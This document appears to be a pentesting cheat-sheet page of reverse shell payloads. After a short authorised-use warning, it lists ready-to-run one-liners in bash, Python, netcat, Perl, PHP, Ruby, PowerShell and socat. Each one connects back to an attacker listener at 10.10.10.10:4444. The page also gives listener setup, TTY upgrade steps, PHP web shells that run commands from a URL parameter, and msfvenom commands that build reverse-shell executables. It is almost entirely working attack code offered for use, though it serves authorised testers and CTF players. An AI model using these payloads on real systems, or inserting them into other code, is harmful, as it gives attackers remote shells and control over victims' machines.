---
title: "Reverse Shells"
description: "Reverse shell one-liners and payloads for bash, Python, netcat, PowerShell, and more — for authorised penetration testing and CTF use."
icon: "💻"
weight: 13
count: 30
tags: ["reverse-shell", "pentesting", "security"]
---

{{< callout type="warning" >}}
These payloads are for **authorised penetration testing, CTF competitions, and security research only**. Use only on systems you have explicit written permission to test.
{{< /callout >}}

## Listener Setup

```bash
# Netcat listener
nc -lvnp 4444

# Ncat with rlwrap (arrow keys in shell)
rlwrap nc -lvnp 4444

# Metasploit multi/handler
msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; run"
```

## Bash

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
0<&196;exec 196<>/dev/tcp/10.10.10.10/4444; sh <&196 >&196 2>&196
```

## Python

```bash
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Netcat

```bash
nc -e /bin/sh 10.10.10.10 4444

# nc without -e flag (mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f

# ncat
ncat 10.10.10.10 4444 -e /bin/bash
```

## Perl

```bash
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## PHP

```bash
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.10.10",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

## Ruby

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.10","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PowerShell (Windows)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Socat

```bash
# Fully interactive listener
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Payload
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

## Upgrading to a Full TTY

```bash
# Step 1 — spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — background and fix terminal
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 cols 200

# Alternative — script method
script /dev/null -c bash

# Best option — socat (fully interactive from the start)
# Attacker:  socat file:`tty`,raw,echo=0 tcp-listen:4444
# Target:    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

## Web Shells (PHP)

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
```

## MSFvenom Payloads

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# List reverse payloads
msfvenom -l payloads | grep reverse
```
